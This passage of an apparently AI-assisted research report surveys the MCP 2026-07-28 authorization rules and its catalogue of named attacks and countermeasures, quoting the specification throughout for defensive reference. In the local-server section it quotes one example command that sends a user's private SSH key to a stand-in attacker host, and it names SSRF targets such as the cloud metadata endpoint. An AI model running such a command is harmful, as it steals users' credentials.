**AI INFERENCE:** The "Final" badge and index entry (quoted) contradict the body's "State: Ready to Review" (quoted); the authoritative status for citation purposes should be the index/badge (Final), but the discrepancy is recorded here because it affects confidence in the SEP as a settled design record.

---

## 7. Access Token Usage, Validation, and Refresh Tokens

### 7.1 Bearer token transport

**SOURCE FACT:** "MCP client **MUST** use the Authorization request header field" — `Authorization: Bearer <access-token>` — and "Note that authorization **MUST** be included in every HTTP request from client to server" ([Authorization, Access Token Usage](https://modelcontextprotocol.io/specification/2026-07-28/basic/authorization/index.md)).

**SOURCE FACT:** "Access tokens **MUST NOT** be included in the URI query string" ([Authorization, Access Token Usage](https://modelcontextprotocol.io/specification/2026-07-28/basic/authorization/index.md)).

### 7.2 Server-side token validation and audience

**SOURCE FACT:** "MCP servers, acting in their role as an OAuth 2.1 resource server, **MUST** validate access tokens as described in OAuth 2.1 Section 5.2" and "MCP servers **MUST** validate that access tokens were issued specifically for them as the intended audience" ([Authorization, Token Handling](https://modelcontextprotocol.io/specification/2026-07-28/basic/authorization/index.md)).

**SOURCE FACT:** "Invalid or expired tokens **MUST** receive a HTTP 401 response"; "MCP clients **MUST NOT** send tokens to the MCP server other than ones issued by the MCP server's authorization server"; "MCP servers **MUST** only accept tokens that are valid for use with their own resources"; "MCP servers **MUST NOT** accept or transit any other tokens" ([Authorization, Token Handling](https://modelcontextprotocol.io/specification/2026-07-28/basic/authorization/index.md)).

**SOURCE FACT:** "MCP servers **MUST** only accept tokens specifically intended for themselves and **MUST** reject tokens that do not include them in the audience claim or otherwise verify that they are the intended recipient of the token" ([Authorization Security Considerations, Access Token Privilege Restriction](https://modelcontextprotocol.io/specification/2026-07-28/basic/authorization/security-considerations.md)).

**SOURCE FACT:** "If the MCP server makes requests to upstream APIs, it may act as an OAuth client to them. The access token used at the upstream API is a separate token, issued by the upstream authorization server. The MCP server **MUST NOT** pass through the token it received from the MCP client" ([Authorization Security Considerations, Access Token Privilege Restriction](https://modelcontextprotocol.io/specification/2026-07-28/basic/authorization/security-considerations.md)).

### 7.3 Token theft and communication security

**SOURCE FACT:** "Attackers who obtain tokens stored by the client, or tokens cached or logged on the server can access protected resources with requests that appear legitimate to resource servers" and "Clients and servers **MUST** implement secure token storage" ([Authorization Security Considerations, Token Theft](https://modelcontextprotocol.io/specification/2026-07-28/basic/authorization/security-considerations.md)).

**SOURCE FACT:** "Authorization servers **SHOULD** issue short-lived access tokens to reduce the impact of leaked tokens. For public clients, authorization servers **MUST** rotate refresh tokens as described in [OAuth 2.1 Section 4.3.1]" ([Authorization Security Considerations, Token Theft](https://modelcontextprotocol.io/specification/2026-07-28/basic/authorization/security-considerations.md)).

**SOURCE FACT:** "All authorization server endpoints **MUST** be served over HTTPS" and "All redirect URIs **MUST** be either `localhost` or use HTTPS" ([Authorization Security Considerations, Communication Security](https://modelcontextprotocol.io/specification/2026-07-28/basic/authorization/security-considerations.md)).

### 7.4 PKCE and authorization-code protection

**SOURCE FACT:** "MCP clients **MUST** implement PKCE according to [OAuth 2.1 Section 7.5.2] and **MUST** verify PKCE support before proceeding with authorization" ([Authorization Security Considerations, Authorization Code Protection](https://modelcontextprotocol.io/specification/2026-07-28/basic/authorization/security-considerations.md)).

**SOURCE FACT:** "MCP clients **MUST** use the `S256` code challenge method when technically capable" ([Authorization Security Considerations, Authorization Code Protection](https://modelcontextprotocol.io/specification/2026-07-28/basic/authorization/security-considerations.md)).

**SOURCE FACT:** If `code_challenge_methods_supported` is absent from OAuth 2.0 Authorization Server Metadata or from OIDC provider metadata, "MCP clients **MUST** refuse to proceed" ([Authorization Security Considerations, Authorization Code Protection](https://modelcontextprotocol.io/specification/2026-07-28/basic/authorization/security-considerations.md)).

**SOURCE FACT:** "Authorization servers providing OpenID Connect Discovery 1.0 **MUST** include `code_challenge_methods_supported` in their metadata to ensure MCP compatibility" ([Authorization Security Considerations, Authorization Code Protection](https://modelcontextprotocol.io/specification/2026-07-28/basic/authorization/security-considerations.md)).

### 7.5 Refresh tokens

**SOURCE FACT:** "**MCP Clients** that desire refresh tokens: **MUST** keep refresh tokens confidential in transit and storage ...; **SHOULD** include `refresh_token` in their `grant_types` client metadata; **MAY** add `offline_access` ...; **MUST NOT** assume refresh tokens will be issued; the AS retains discretion" ([Authorization, Refresh Tokens](https://modelcontextprotocol.io/specification/2026-07-28/basic/authorization/index.md)).

**SOURCE FACT:** "**MCP Servers** (Protected Resources) **SHOULD NOT** include `offline_access` in `WWW-Authenticate` scope or Protected Resource Metadata `scopes_supported`, as refresh tokens are not a resource requirement" ([Authorization, Refresh Tokens](https://modelcontextprotocol.io/specification/2026-07-28/basic/authorization/index.md)).

### 7.6 Error handling and insufficient-scope challenges

**SOURCE FACT:** "Servers **MUST** return appropriate HTTP status codes for authorization errors": 401 "Unauthorized / Authorization required or token invalid", 403 "Forbidden / Invalid scopes or insufficient permissions", 400 "Bad Request / Malformed authorization request" ([Authorization, Error Handling](https://modelcontextprotocol.io/specification/2026-07-28/basic/authorization/index.md)).

**SOURCE FACT:** On runtime insufficient scope, the server "**SHOULD** respond with: `HTTP 403 Forbidden` ...; `WWW-Authenticate` header with the `Bearer` scheme and additional parameters: `error="insufficient_scope"` ...; `scope="required_scope1 required_scope2"` ...; `resource_metadata` ...; `error_description` (optional)" ([Authorization, Runtime Insufficient Scope Errors](https://modelcontextprotocol.io/specification/2026-07-28/basic/authorization/index.md)).

**SOURCE FACT:** Initial scope selection follows a priority: "1. **Use `scope` parameter** from the initial `WWW-Authenticate` header in the 401 response, if provided 2. **If `scope` is not available**, use all scopes defined in `scopes_supported` from the Protected Resource Metadata document" ([Authorization, Scope Selection Strategy](https://modelcontextprotocol.io/specification/2026-07-28/basic/authorization/index.md)).

**SOURCE FACT:** Step-up requires unioning scopes: "**Determine required scopes** by computing the union of the client's previously requested scope set and the scopes from the current challenge" ([Authorization, Step-Up Authorization Flow](https://modelcontextprotocol.io/specification/2026-07-28/basic/authorization/index.md)).

**SOURCE FACT:** "Servers **MUST** account for scope hierarchies, where a broader scope implies narrower ones, when deciding whether a token is sufficient for an operation" ([Authorization, Step-Up Authorization Flow](https://modelcontextprotocol.io/specification/2026-07-28/basic/authorization/index.md)).

**AI INFERENCE:** The scope machinery couples three separate requirements — servers emit `scope` in 401/403 challenges (quoted), clients union those scopes with prior grants (quoted), and servers honor scope hierarchies (quoted). A server that emits only the current operation's missing scope will force repeated round-trips unless the client accumulates, which is why the client-side union rule exists.

---

## 8. Named Attack / Risk Catalogue and Countermeasures

The tutorial's Security Best Practices page is the catalogue: "This document identifies security risks, attack vectors, and best practices specific to MCP implementations" ([Security Best Practices, Purpose and Scope](https://modelcontextprotocol.io/docs/2026-07-28/tutorials/security/security_best_practices.md)).

### 8.1 Confused deputy problem (OAuth proxy)

**SOURCE FACT:** "Attackers can exploit MCP proxy servers that connect to third-party APIs, creating "[confused deputy](https://en.wikipedia.org/wiki/Confused_deputy_problem)" vulnerabilities. This attack allows malicious clients to obtain authorization codes without proper user consent by exploiting the combination of static client IDs, dynamic client registration, and consent cookies" ([Security Best Practices, Confused Deputy Problem](https://modelcontextprotocol.io/docs/2026-07-28/tutorials/security/security_best_practices.md)).

**SOURCE FACT:** Vulnerable conditions require all of: "MCP proxy server uses a **static client ID** with a third-party authorization server", "MCP proxy server allows MCP clients to **dynamically register**", "The third-party authorization server sets a **consent cookie** after the first authorization", and "MCP proxy server does not implement proper per-client consent before forwarding to third-party authorization" ([Security Best Practices](https://modelcontextprotocol.io/docs/2026-07-28/tutorials/security/security_best_practices.md)).

**SOURCE FACT — countermeasure:** "To prevent confused deputy attacks, MCP proxy servers **MUST** implement per-client consent and proper security controls"; the required controls include maintaining "a registry of approved `client_id` values per user", consent UI that shows the client name, scopes and `redirect_uri` with "CSRF protection" and framing protection, consent cookies with `__Host-` prefix and `Secure`, `HttpOnly`, `SameSite=Lax`, and redirect URI validation using "exact string matching (not pattern matching or wildcards)" ([Security Best Practices, Required Protections](https://modelcontextprotocol.io/docs/2026-07-28/tutorials/security/security_best_practices.md)).

**SOURCE FACT:** The spec-level version: "MCP proxy servers using static client IDs **MUST** obtain user consent for each [dynamically registered client] before forwarding to third-party authorization servers (which may require additional consent)" ([Authorization Security Considerations, Confused Deputy Problem](https://modelcontextprotocol.io/specification/2026-07-28/basic/authorization/security-considerations.md)).

**SOURCE FACT:** OAuth `state` must not be set before consent: "The consent cookie or session containing the `state` value **MUST NOT** be set until **after** the user has approved the consent screen at the MCP server's authorization endpoint" ([Security Best Practices](https://modelcontextprotocol.io/docs/2026-07-28/tutorials/security/security_best_practices.md)).

### 8.2 Token passthrough

**SOURCE FACT:** ""Token passthrough" is an anti-pattern where an MCP server accepts tokens from an MCP client without validating that the tokens were properly issued *to the MCP server* and passes them through to the downstream API" ([Security Best Practices, Token Passthrough](https://modelcontextprotocol.io/docs/2026-07-28/tutorials/security/security_best_practices.md)).

**SOURCE FACT:** It has "two critical dimensions": "**Audience validation failures.**" (citing [RFC9068](https://www.rfc-editor.org/rfc/rfc9068.html)) and "**Token passthrough.**" which "can potentially cause the "confused deputy" problem" ([Security Best Practices, Token Passthrough](https://modelcontextprotocol.io/docs/2026-07-28/tutorials/security/security_best_practices.md)).

**SOURCE FACT — countermeasure:** "MCP servers **MUST NOT** accept any tokens that were not explicitly issued for the MCP server" ([Security Best Practices, Token Passthrough Mitigation](https://modelcontextprotocol.io/docs/2026-07-28/tutorials/security/security_best_practices.md)).

**SOURCE FACT:** The tutorial names four risk categories for passthrough: "Security Control Circumvention", "Accountability and Audit Trail Issues", "Trust Boundary Issues", and "Future Compatibility Risk" ([Security Best Practices](https://modelcontextprotocol.io/docs/2026-07-28/tutorials/security/security_best_practices.md)).

### 8.3 Server-Side Request Forgery (SSRF)

**SOURCE FACT:** "During OAuth metadata discovery, MCP clients fetch URLs from several sources that could be controlled by a malicious MCP server: 1. The `resource_metadata` URL from the `WWW-Authenticate` header 2. The `authorization_servers` URLs from the Protected Resource Metadata document 3. The `token_endpoint`, `authorization_endpoint`, and other URLs from Authorization Server Metadata" ([Security Best Practices, SSRF](https://modelcontextprotocol.io/docs/2026-07-28/tutorials/security/security_best_practices.md)).

**SOURCE FACT:** Attack patterns include "Direct internal IP access", "Cloud metadata endpoints" such as "`http://169.254.169.254/` (AWS/GCP/Azure metadata service)", "Localhost services", "DNS rebinding", and "Redirect chains" ([Security Best Practices](https://modelcontextprotocol.io/docs/2026-07-28/tutorials/security/security_best_practices.md)).

**SOURCE FACT — countermeasure:** "MCP clients deployed to a server **MUST** consider SSRF risks and implement appropriate mitigations when fetching OAuth-related URLs. Which protections are appropriate depend on your network environment" ([Security Best Practices, SSRF Mitigation](https://modelcontextprotocol.io/docs/2026-07-28/tutorials/security/security_best_practices.md)).

**SOURCE FACT:** Recommended mitigations include requiring HTTPS, blocking private IPv4 ranges "`10.0.0.0/8`, `172.16.0.0/12`, `192.168.0.0/16`", loopback "`127.0.0.0/8`, `::1`", link-local "`169.254.0.0/16`", and private IPv6 "`fc00::/7`, `fe80::/10`", plus egress proxies (naming Stripe's Smokescreen) ([Security Best Practices, Block Private IP Ranges](https://modelcontextprotocol.io/docs/2026-07-28/tutorials/security/security_best_practices.md)).

**SOURCE FACT:** "Avoid implementing IP validation manually. Attackers exploit encoding tricks (octal, hex, IPv4-mapped IPv6) that custom parsers often miss" ([Security Best Practices](https://modelcontextprotocol.io/docs/2026-07-28/tutorials/security/security_best_practices.md)).

**SOURCE FACT:** SSRF also applies to authorization servers fetching CIMD: "When an authorization server supports [Client ID Metadata Documents], the authorization server takes a URL as input from an unknown client and fetches that URL" ([Security Best Practices, SSRF Against Authorization Servers](https://modelcontextprotocol.io/docs/2026-07-28/tutorials/security/security_best_practices.md)).

### 8.4 State handle hijacking (the current form of "session hijacking")

**SOURCE FACT:** "MCP is [stateless] and has no protocol-level sessions. Servers that need state spanning multiple requests mint an explicit handle, such as a shopping cart ID or a workflow ID, and receive it back as an ordinary tool argument on each request. State handle hijacking is an attack vector where an unauthorized party obtains or guesses such a handle and uses it to access or modify another user's state" ([Security Best Practices, State Handle Hijacking](https://modelcontextprotocol.io/docs/2026-07-28/tutorials/security/security_best_practices.md)).

**SOURCE FACT — countermeasure:** "MCP servers that implement authorization **MUST** verify all inbound requests. MCP servers **MUST NOT** treat possession of a state handle as authentication" ([Security Best Practices, State Handle Hijacking Mitigation](https://modelcontextprotocol.io/docs/2026-07-28/tutorials/security/security_best_practices.md)).

**SOURCE FACT:** "MCP servers **SHOULD** use secure, non-deterministic handles generated with secure random number generators" and "**SHOULD** bind handles server-side to the authenticated user, for example by keying stored state as `<user_id>:<handle>`" ([Security Best Practices, State Handle Hijacking Mitigation](https://modelcontextprotocol.io/docs/2026-07-28/tutorials/security/security_best_practices.md)).

**SOURCE FACT:** The classic "Session Hijacking" content survives only as a legacy reference: "For guidance on securing the server-assigned session IDs used by protocol version `2025-11-25` and earlier, see [Session Hijacking in the 2025-11-25 version of this page]" ([Security Best Practices, State Handle Hijacking](https://modelcontextprotocol.io/docs/2026-07-28/tutorials/security/security_best_practices.md)).

**SOURCE FACT (changelog):** The `2026-07-28` revision "Remove[s] protocol-level sessions and the `Mcp-Session-Id` header from the Streamable HTTP transport" and says "Servers that need cross-call state use explicit, server-minted handles passed as ordinary tool arguments ([SEP-2567])" ([Key Changes, Major changes item 1](https://modelcontextprotocol.io/specification/2026-07-28/changelog.md)).

**AI INFERENCE:** "Session hijacking" in the 2026-07-28 revision is no longer a session-ID attack because protocol sessions and `Mcp-Session-Id` were removed (quoted changelog and spec); the equivalent current risk is state-handle hijacking (quoted), and the legacy session guidance is explicitly scoped to `2025-11-25` and earlier (quoted). A report that describes "session hijacking" against 2026-07-28 should map it to state handle hijacking.

**SOURCE CLAIM (stale tutorial text):** The same tutorial's pitfalls list still says "**Session identifier hardening**. Treat `Mcp-Session-Id` as untrusted input; never tie authorization to it. Regenerate on auth changes and validate lifecycle server‑side" ([Understanding Authorization in MCP, Common Pitfalls](https://modelcontextprotocol.io/docs/2026-07-28/tutorials/security/authorization.md)), even though the changelog removes `Mcp-Session-Id` ([Key Changes](https://modelcontextprotocol.io/specification/2026-07-28/changelog.md)).

**AI INFERENCE:** The pitfall-list mention of `Mcp-Session-Id` (quoted) conflicts with the changelog's removal of that header (quoted), so the pitfalls list in the authorization tutorial is partially stale relative to the 2026-07-28 core specification; treat the core spec as authoritative.

### 8.5 Local MCP server compromise

**SOURCE FACT:** "Local MCP servers are MCP Servers running on a user's local machine, either by the user downloading and executing a server, authoring a server themselves, or installing through a client's configuration flows" ([Security Best Practices, Local MCP Server Compromise](https://modelcontextprotocol.io/docs/2026-07-28/tutorials/security/security_best_practices.md)).

**SOURCE FACT:** The attack description covers "An attacker includes a malicious "startup" command in a client configuration", "An attacker distributes a malicious payload inside the server itself", and "An attacker accesses an insecure local server that's left running on localhost via DNS rebinding"; example malicious commands include `npx malicious-package && curl -X POST -d @~/.ssh/id_rsa https://example.com/evil-location` ([Security Best Practices](https://modelcontextprotocol.io/docs/2026-07-28/tutorials/security/security_best_practices.md)).

**SOURCE FACT — countermeasure:** "If an MCP client supports one-click local MCP server configuration, it **MUST** implement proper consent mechanisms prior to executing commands" ([Security Best Practices, Local MCP Server Compromise Mitigation](https://modelcontextprotocol.io/docs/2026-07-28/tutorials/security/security_best_practices.md)).

**SOURCE FACT:** Required consent behavior includes "Show the exact command that will be executed, without truncation (include arguments and parameters)" and "Require explicit user approval before proceeding", with additional SHOULD-level sandboxing guidance ([Security Best Practices, Pre-Configuration Consent](https://modelcontextprotocol.io/docs/2026-07-28/tutorials/security/security_best_practices.md)).

**SOURCE FACT — SEP-1024 backing:** "This proposal establishes a best practice for MCP clients, requiring explicit user consent before executing any local server installation commands and complete command transparency" ([SEP-1024](https://modelcontextprotocol.io/seps/1024-mcp-client-security-requirements-for-local-server-.md)).

**SOURCE FACT:** SEP-1024 requires the consent dialog to show "The exact command that will be executed, without truncation", "All arguments and parameters", and "A clear warning that this operation may be potentially dangerous", with an affirmative action and a cancel option ([SEP-1024, Pre-Configuration Consent](https://modelcontextprotocol.io/seps/1024-mcp-client-security-requirements-for-local-server-.md)).

**SOURCE FACT:** SEP-1024 is "Final", "Standards Track", created "2025-07-22", author "Den Delimarsky" ([SEP-1024](https://modelcontextprotocol.io/seps/1024-mcp-client-security-requirements-for-local-server-.md)).

**SOURCE FACT:** Countermeasures for local servers include: "Use the `stdio` transport to limit access to just the MCP client" and, for HTTP transports, "Require an authorization token" or "Use unix domain sockets or other Interprocess Communication (IPC) mechanisms with restricted access" ([Security Best Practices, Local MCP Server Compromise Mitigation](https://modelcontextprotocol.io/docs/2026-07-28/tutorials/security/security_best_practices.md)).

### 8.6 OAuth authorization URL validation (XSS/RCE)

**SOURCE FACT:** "OAuth authorization URLs provided by malicious MCP servers can exploit client-side URL handling vulnerabilities, leading to Cross-Site Scripting (XSS) attacks and Remote Code Execution (RCE)" ([Security Best Practices, OAuth Authorization URL Validation](https://modelcontextprotocol.io/docs/2026-07-28/tutorials/security/security_best_practices.md)).

**SOURCE FACT:** Attack vectors include "JavaScript URL Injection (XSS)" via `javascript:` URLs passed to `window.open()`, "Command Injection via Shell Execution", and "stdio Transport Privilege Escalation" ([Security Best Practices](https://modelcontextprotocol.io/docs/2026-07-28/tutorials/security/security_best_practices.md)).

**SOURCE FACT — countermeasure:** "MCP clients **MUST** only allow `http://` and `https://` schemes for authorization URLs" and "**MUST** reject `javascript:`, `data:`, `file:`, `vbscript:`, and other potentially dangerous schemes", preferring "allowlist-based validation rather than blocklist-based approaches" ([Security Best Practices, URL Scheme Validation](https://modelcontextprotocol.io/docs/2026-07-28/tutorials/security/security_best_practices.md)).

**SOURCE FACT:** "MCP clients **MUST** avoid shell execution when opening URLs" and "**MUST NOT** use shell commands (e.g., `cmd.exe`, `sh`, PowerShell) to open URLs" ([Security Best Practices, Secure URL Opening](https://modelcontextprotocol.io/docs/2026-07-28/tutorials/security/security_best_practices.md)).

### 8.7 stdio transport security in proxy scenarios

**SOURCE FACT:** "The `stdio` transport itself is not inherently vulnerable. However, in proxy architectures where a separate proxy service manages `stdio` connections and can spawn MCP servers as child processes, it can provide a critical escalation path from web-based attacks to full system compromise" ([Security Best Practices, stdio Transport Security in Proxy Scenarios](https://modelcontextprotocol.io/docs/2026-07-28/tutorials/security/security_best_practices.md)).

**SOURCE FACT:** "Important: This attack vector only applies to MCP implementations that use a proxy architecture, not to direct `stdio` transport usage" ([Security Best Practices](https://modelcontextprotocol.io/docs/2026-07-28/tutorials/security/security_best_practices.md)).

**SOURCE FACT — countermeasure:** "MCP proxy services **SHOULD** implement additional security controls for `stdio` transport": "Implement sandboxing or containerization for spawned processes", "Restrict file system access", "Log all `stdio` transport usage", and "Require additional authorization for potentially dangerous commands" ([Security Best Practices](https://modelcontextprotocol.io/docs/2026-07-28/tutorials/security/security_best_practices.md)).

### 8.8 Mix-up attacks

**SOURCE FACT:** "An MCP client typically interacts with many authorization servers over its lifetime. An attacker that controls one of those authorization servers may attempt to have the client send it an authorization code or token issued by a different, honest authorization server (a mix-up attack, described in [RFC9207 Section 1])" ([Security Best Practices, Mix-Up Attacks](https://modelcontextprotocol.io/docs/2026-07-28/tutorials/security/security_best_practices.md)).

**SOURCE FACT:** "PKCE alone does not prevent this attack because the client transmits the `code_verifier` to the attacker's token endpoint. Resource indicators do not help when the attacker's authorization server is intercepting requests before they hit the honest authorization server. This mitigation depends on honest authorization servers emitting `iss`; it provides no protection against an honest server that does not" ([Security Best Practices, Mix-Up Attacks Mitigation](https://modelcontextprotocol.io/docs/2026-07-28/tutorials/security/security_best_practices.md)).

**AI INFERENCE:** The `iss` defense is necessary but has a stated residual gap: it "provides no protection against an honest server that does not" emit `iss` (quoted). Combined with the server-side `SHOULD` (quoted earlier), a 2026-07-28 deployment whose AS omits `iss` remains exposed to mix-up attacks.

### 8.9 Localhost redirect URI impersonation

**SOURCE FACT:** "Client ID Metadata Documents cannot prevent `localhost` URL impersonation by themselves"; an attacker can provide "the legitimate client's metadata URL as their `client_id`", bind to the same localhost port, and "Receiv[e] the authorization code via the redirect when the user approves" ([Security Best Practices, Localhost Redirect URI Impersonation](https://modelcontextprotocol.io/docs/2026-07-28/tutorials/security/security_best_practices.md)).

**SOURCE FACT — countermeasure:** Authorization servers "**SHOULD** display additional warnings for `localhost`-only redirect URIs"; "**MAY** require additional attestation mechanisms for enhanced security"; and "**MUST** clearly display the redirect URI hostname during authorization" ([Authorization Security Considerations, Localhost Redirect URI Risks](https://modelcontextprotocol.io/specification/2026-07-28/basic/authorization/security-considerations.md)).

### 8.10 CIMD trust policies

**SOURCE FACT:** "Authorization servers that accept [Client ID Metadata Documents] can apply domain-based trust policies to decide which URL-based client IDs to accept": allowlists for trusted domains, accept-any-HTTPS for open servers, reputation checks, restrictions based on domain age or certificate validation, and prominently displaying client hostnames "to prevent phishing" ([Security Best Practices, CIMD Trust Policies](https://modelcontextprotocol.io/docs/2026-07-28/tutorials/security/security_best_practices.md)).

**SOURCE FACT:** SEP-991 frames the same as "Server-Controlled Trust Without Pre-Coordination": open servers "Can accept any HTTPS client\_id, enabling maximum interoperability" while protected servers "Can restrict to trusted domains or specific clients" ([SEP-991](https://modelcontextprotocol.io/seps/991-enable-url-based-client-registration-using-oauth-c.md)).

### 8.11 Scope minimization

**SOURCE FACT:** "Poor scope design increases token compromise impact, elevates user friction, and obscures audit trails" ([Security Best Practices, Scope Minimization](https://modelcontextprotocol.io/docs/2026-07-28/tutorials/security/security_best_practices.md)).

**SOURCE FACT:** Mitigation is a "progressive, least-privilege scope model": "Minimal initial scope set (e.g., `mcp:tools-basic`)", "Incremental elevation via targeted `WWW-Authenticate` `scope="..."` challenges", and "Down-scoping tolerance: server should accept reduced scope tokens; auth server MAY issue a subset of requested scopes" ([Security Best Practices, Scope Minimization Mitigation](https://modelcontextprotocol.io/docs/2026-07-28/tutorials/security/security_best_practices.md)).

**SOURCE FACT:** The "Common Mistakes" list includes "Using wildcard or omnibus scopes (`*`, `all`, `full-access`)" and "Treating claimed scopes in token as sufficient without server-side authorization logic" ([Security Best Practices, Common Mistakes](https://modelcontextprotocol.io/docs/2026-07-28/tutorials/security/security_best_practices.md)).

### 8.12 Open redirection

**SOURCE FACT:** "An attacker may craft malicious redirect URIs to direct users to phishing sites. MCP clients **MUST** have redirect URIs registered with the authorization server. Authorization servers **MUST** validate exact redirect URIs against pre-registered values to prevent redirection attacks" ([Authorization Security Considerations, Open Redirection](https://modelcontextprotocol.io/specification/2026-07-28/basic/authorization/security-considerations.md)).

### 8.13 Token theft, DCR abuse, and other pitfalls (tutorial list)

**SOURCE FACT — tutorial pitfalls:** "Do not implement token validation or authorization logic by yourself", "Use short-lived access tokens", "Always validate tokens", "Store tokens in secure, encrypted storage", "Enforce HTTPS in production", "Least-privilege scopes", "Don't log credentials", "Separate app vs. resource server credentials", "Return proper challenges", "DCR (Dynamic Client Registration) controls", "Multi-tenant/realm mix-ups", "Audience/resource indicator misuse", "Error detail leakage", and "Session identifier hardening" ([Understanding Authorization in MCP, Common Pitfalls and How to Avoid Them](https://modelcontextprotocol.io/docs/2026-07-28/tutorials/security/authorization.md)).

**SOURCE FACT:** On DCR: "If enabled, be aware of constraints specific to your organization, such as trusted hosts, required vetting, and audited registrations. Unauthenticated DCR means that anyone can register any client with your authorization server" ([Understanding Authorization in MCP](https://modelcontextprotocol.io/docs/2026-07-28/tutorials/security/authorization.md)).

**SOURCE FACT:** On multi-tenancy: "Pin to a single issuer/tenant unless explicitly multi-tenant. Reject tokens from other realms even if signed by the same authorization server" ([Understanding Authorization in MCP](https://modelcontextprotocol.io/docs/2026-07-28/tutorials/security/authorization.md)).

**SOURCE FACT:** On audience: "Don't configure or accept generic audiences (like `api`) or unrelated resources. Require the audience/resource to match your configured server" ([Understanding Authorization in MCP](https://modelcontextprotocol.io/docs/2026-07-28/tutorials/security/authorization.md)).

---

## 9. Implementation Walkthrough (Tutorial) — Scope and Caveats

**SOURCE FACT:** The tutorial's end-to-end example uses "a [Keycloak](https://www.keycloak.org/) authorization server hosted in a Docker container" and the `docker run` command `docker run -p 127.0.0.1:8080:8080 -e KC_BOOTSTRAP_ADMIN_USERNAME=admin -e KC_BOOTSTRAP_ADMIN_PASSWORD=admin quay.io/keycloak/keycloak start-dev` ([Understanding Authorization in MCP, Keycloak Setup](https://modelcontextprotocol.io/docs/2026-07-28/tutorials/security/authorization.md)).

**SOURCE FACT:** The tutorial warns the sample config is not production-ready: "The configuration above may be suitable for testing and experimentation; however, you should never use it in production" ([Understanding Authorization in MCP](https://modelcontextprotocol.io/docs/2026-07-28/tutorials/security/authorization.md)).

**SOURCE FACT:** It describes the audience configuration as test-only: "The audience configuration above is meant for testing. For production scenarios, additional set-up and configuration will be required to ensure that audiences are properly constrained for issued tokens. Specifically, the audience needs to be based on the resource parameter passed from the client, not a fixed value" ([Understanding Authorization in MCP](https://modelcontextprotocol.io/docs/2026-07-28/tutorials/security/authorization.md)).

**SOURCE FACT:** The tutorial presents client registration as "two ways" — "pre-registered" or "Dynamic Client Registration" — and does not mention Client ID Metadata Documents ([Understanding Authorization in MCP, Client Registration](https://modelcontextprotocol.io/docs/2026-07-28/tutorials/security/authorization.md)).

**SOURCE CLAIM (staleness):** The current core spec states there are "three client registration mechanisms" and makes CIMD a SHOULD with DCR deprecated ([Client Registration](https://modelcontextprotocol.io/specification/2026-07-28/basic/authorization/client-registration.md)), which conflicts with the tutorial's "two ways" framing ([Understanding Authorization in MCP](https://modelcontextprotocol.io/docs/2026-07-28/tutorials/security/authorization.md)).

**AI INFERENCE:** The authorization tutorial (quoted "two ways" and no CIMD) lags the core spec (quoted "three ... mechanisms", CIMD SHOULD, DCR deprecated) at the same `2026-07-28` revision. Implementers should treat the core specification as authoritative for registration mechanics and the tutorial as an illustration whose DCR/Keycloak path is the older flow.

**SOURCE FACT:** The tutorial recommends external validation approaches: "Worth noting that token introspection is just *one of* the available approaches to validate tokens. This can also be done with the help of standalone libraries, specific to each language and platform" ([Understanding Authorization in MCP](https://modelcontextprotocol.io/docs/2026-07-28/tutorials/security/authorization.md)).

**SOURCE FACT:** On secrets: "Never embed client credentials directly in your code. We recommend using environment variables or specialized solutions for secret storage" ([Understanding Authorization in MCP](https://modelcontextprotocol.io/docs/2026-07-28/tutorials/security/authorization.md)).

---

## 10. Open Items, Discrepancies, and Unverified Points

The following are recorded rather than resolved, per the mandate to preserve exact labels and avoid inventing facts.

- **SEP number/URL mismatch (source fact):** The brief referenced "SEP-2468" without a URL; the guessed URL `.../seps/2468-authorization-server-issuer-validation.md` returned 404. The document exists at [`/seps/2468-recommend-issuer-claim-for-auth`](https://modelcontextprotocol.io/seps/2468-recommend-issuer-claim-for-auth). **UNKNOWN:** whether any redirect or alternate slug exists.
- **CIMD draft identifier drift (source fact):** SEP-991 cites `draft-parecki-oauth-client-id-metadata-document-03` ([SEP-991](https://modelcontextprotocol.io/seps/991-enable-url-based-client-registration-using-oauth-c.md)); the current spec cites `draft-ietf-oauth-client-id-metadata-document-00` ([Authorization](https://modelcontextprotocol.io/specification/2026-07-28/basic/authorization/index.md)). **UNKNOWN:** the exact revision history of the CIMD draft between those two identifiers.
- **SEP-990 status inconsistency (source fact):** green "Final" badge/index vs. body "**State:** Ready to Review" ([SEP-990](https://modelcontextprotocol.io/seps/990-enable-enterprise-idp-policy-controls-during-mcp-o.md), [SEP index](https://modelcontextprotocol.io/seps/index.md)).
- **Authorization tutorial partial staleness (source fact + AI INFERENCE):** tutorial says "two ways" for registration and warns about `Mcp-Session-Id`, while the core spec has three mechanisms/CIMD and the changelog removes `Mcp-Session-Id` ([tutorial](https://modelcontextprotocol.io/docs/2026-07-28/tutorials/security/authorization.md), [Client Registration](https://modelcontextprotocol.io/specification/2026-07-28/basic/authorization/client-registration.md), [changelog](https://modelcontextprotocol.io/specification/2026-07-28/changelog.md)).
- **OAuth 2.1 draft revision label (source fact):** The core spec's standards list names `draft-ietf-oauth-v2-1-13` ([Authorization](https://modelcontextprotocol.io/specification/2026-07-28/basic/authorization/index.md)), but its Refresh Tokens section links to `draft-ietf-oauth-v2-1-14` ([Authorization, Refresh Tokens](https://modelcontextprotocol.io/specification/2026-07-28/basic/authorization/index.md)). **UNKNOWN:** which draft revision is normatively intended by that internal link.
- **SEP-1046 RFC number typo (source fact):** The Specification section refers to "RFC 753 (JWT Assertions)" while the Rationale refers to "RFC 7523" ([SEP-1046](https://modelcontextprotocol.io/seps/1046-support-oauth-client-credentials-flow-in-authoriza.md)). **AI INFERENCE:** "RFC 7523" in the Rationale is the correct JWT-assertions RFC; "RFC 753" appears to be a typo. Labeled as inference, not fact.
- **PLAUSIBLE NOT VERIFIED:** That all SDKs have adopted CIMD and `iss` validation uniformly. The SEP-2468 record lists Go SDK PR `modelcontextprotocol/go-sdk#859` and TypeScript SDK PR `modelcontextprotocol/typescript-sdk#1957` as reference implementations ([SEP-2468](https://modelcontextprotocol.io/seps/2468-recommend-issuer-claim-for-auth.md)), but this research did not fetch or confirm the merged state of those PRs.
- **UNKNOWN:** The exact conformance test requirements enforcing these authorization MUSTs in the `2026-07-28` revision; SEP-2484 ("Require Conformance Tests for Standards Track SEPs to Reach Final Status") appears in the [SEP index](https://modelcontextprotocol.io/seps/index.md) but its content was not retrieved.
- **UNKNOWN:** Any current specification requirement specifically named "proxy" or "SSRF" beyond the tutorial's Security Best Practices document; the core authorization Security Considerations page links the SSRF discussion to the tutorial rather than restating it.

---

## 11. Condensed Normative Checklist for an MCP Server Implementer (2026-07-28)

Derived strictly from the quoted MUST/SHOULD statements above; each line names the quoted fact it depends on.

